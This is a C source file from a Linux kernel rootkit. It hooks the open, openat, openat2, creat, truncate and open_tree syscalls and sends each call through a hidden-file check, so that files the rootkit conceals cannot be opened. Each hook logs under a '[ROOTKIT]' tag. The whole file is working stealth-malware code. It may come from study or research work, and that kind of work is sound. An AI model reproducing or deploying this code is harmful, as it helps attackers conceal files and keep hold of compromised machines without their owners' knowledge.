#include "hooking.h"
#include "macro_utils.h"
#include "syscall_hooks.h"
#include <asm-generic/errno-base.h>
#include <linux/fcntl.h>
#include <linux/openat2.h>
#include <linux/printk.h>
#include <linux/types.h>
#include <linux/uaccess.h>
#include <uapi/linux/mount.h>

static inline long do_open(const sysfun_t orig_func, struct pt_regs *const p_regs,
                           const int i32_dfd, const char __user *const s_filename,
                           const int i32_flags)
{
    int i32_at_flags = 0; // AT_* flags for lookup

    IF_U (i32_flags & ~VALID_OPEN_FLAGS) {
        return -EINVAL;
    }

    if (i32_flags & O_NOFOLLOW) {
        i32_at_flags |= AT_SYMLINK_NOFOLLOW;
    }

    if (i32_flags & O_CREAT) {
        i32_at_flags |= AT_LOOKUP_CREATE;
    }

    return do_check_hidden(orig_func, p_regs, i32_dfd, s_filename, i32_at_flags);
}

// sys_open syscall hook handler
SYSCALL_HOOK_HANDLER3(open, orig_open, p_regs, const char __user *, s_filename, int, i32_flags,
                      umode_t, ui16_mode)
{
    pr_info("[ROOTKIT] open(%p, %s%#x, %#ho)\n", s_filename, SIGNED_ARG(i32_flags), ui16_mode);

    return do_open(orig_open, p_regs, AT_FDCWD, s_filename, i32_flags);
}

// sys_openat syscall hook handler
SYSCALL_HOOK_HANDLER4(openat, orig_openat, p_regs, int, i32_dfd, const char __user *, s_filename,
                      int, i32_flags, umode_t, ui16_mode)
{
    pr_info("[ROOTKIT] openat(%d, %p, %s%#x, %#ho)\n", i32_dfd, s_filename, SIGNED_ARG(i32_flags),
            ui16_mode);

    return do_open(orig_openat, p_regs, i32_dfd, s_filename, i32_flags);
}

// sys_openat2 syscall hook handler
SYSCALL_HOOK_HANDLER4(openat2, orig_openat2, p_regs, int, i32_dfd, const char __user *, s_filename,
                      struct open_how __user *, p_how, size_t, sz_usize)
{
    int err;
    struct open_how tmp_how;

    pr_info("[ROOTKIT] openat2(%d, %p, %p, %zu)\n", i32_dfd, s_filename, p_how, sz_usize);

    // Following code is based on fs/open.c:sys_openat2()

    IF_U (sz_usize < OPEN_HOW_SIZE_VER0) {
        return -EINVAL;
    }

    err = copy_struct_from_user(&tmp_how, sizeof(tmp_how), p_how, sz_usize);
    if (err != 0) {
        return err;
    }

    return do_open(orig_openat2, p_regs, i32_dfd, s_filename, tmp_how.flags);
}

// sys_creat syscall hook handler
SYSCALL_HOOK_HANDLER2(creat, orig_creat, p_regs, const char __user *, s_filename, umode_t,
                      ui16_mode)
{
    pr_info("[ROOTKIT] creat(%p, %#ho)\n", s_filename, ui16_mode);

    return do_open(orig_creat, p_regs, AT_FDCWD, s_filename, O_CREAT | O_WRONLY | O_TRUNC);
}

// sys_truncate syscall hook handler
SYSCALL_HOOK_HANDLER2(truncate, orig_truncate, p_regs, const char __user *, s_filename, long,
                      i64_length)
{
    pr_info("[ROOTKIT] truncate(%p, %ld)\n", s_filename, i64_length);

    return do_check_hidden(orig_truncate, p_regs, AT_FDCWD, s_filename, 0);
}

// sys_open_tree syscall hook handler
SYSCALL_HOOK_HANDLER3(open_tree, orig_open_tree, p_regs, int, i32_dfd, const char __user *,
                      s_filename, unsigned int, ui32_flags)
{
    pr_info("[ROOTKIT] open_tree(%d, %p, %#x)\n", i32_dfd, s_filename, ui32_flags);

    // Following code is based on fs/namespace.c:2471
    if (ui32_flags & ~(AT_EMPTY_PATH | AT_NO_AUTOMOUNT | AT_RECURSIVE | AT_SYMLINK_NOFOLLOW |
                       OPEN_TREE_CLONE | OPEN_TREE_CLOEXEC)) {
        return -EINVAL;
    }

    if ((ui32_flags & (AT_RECURSIVE | OPEN_TREE_CLONE)) == AT_RECURSIVE) {
        return -EINVAL;
    }

    if ((ui32_flags & OPEN_TREE_CLONE) && !may_mount()) {
        return -EPERM;
    }

    return do_check_hidden(orig_open_tree, p_regs, i32_dfd, s_filename, ui32_flags);
}
